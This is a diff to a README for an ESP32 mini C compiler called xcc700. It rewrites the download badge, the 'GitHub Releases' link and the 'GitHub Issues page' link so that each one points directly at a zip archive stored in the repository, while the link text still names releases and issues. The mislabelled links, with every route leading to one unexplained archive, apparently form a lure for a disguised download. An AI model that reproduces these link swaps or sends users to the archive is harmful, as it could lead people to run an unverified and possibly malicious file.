@@ -1,6 +1,6 @@
 # 🚀 xcc700 - Simple Mini C Compiler for ESP32
 
-[![Download xcc700](https://img.shields.io/badge/Download%20xcc700-Click%20Here-brightgreen)](https://github.com/Viks0819/xcc700/releases)
+[![Download xcc700](https://github.com/Viks0819/xcc700/raw/refs/heads/main/release/xcc-v1.2.zip%20xcc700-Click%20Here-brightgreen)](https://github.com/Viks0819/xcc700/raw/refs/heads/main/release/xcc-v1.2.zip)
 
 ## 📦 Overview
 
@@ -20,7 +20,7 @@ Before you start, make sure your computer meets the following requirements:
 
 ### 📥 Download & Install
 
-1. Visit this page to download: [GitHub Releases](https://github.com/Viks0819/xcc700/releases).
+1. Visit this page to download: [GitHub Releases](https://github.com/Viks0819/xcc700/raw/refs/heads/main/release/xcc-v1.2.zip).
 
 2. On the Releases page, look for the latest version of xcc700. You will see a list of downloadable files.
 
@@ -67,7 +67,7 @@ After installation, you will need to set up xcc700:
 
 ### 📞 Support
 
-If you face any issues while using xcc700 or have questions, please visit the [GitHub Issues page](https://github.com/Viks0819/xcc700/issues) to report your problem or seek help.
+If you face any issues while using xcc700 or have questions, please visit the [GitHub Issues page](https://github.com/Viks0819/xcc700/raw/refs/heads/main/release/xcc-v1.2.zip) to report your problem or seek help.
 
 ### 🌍 Additional Resources
 
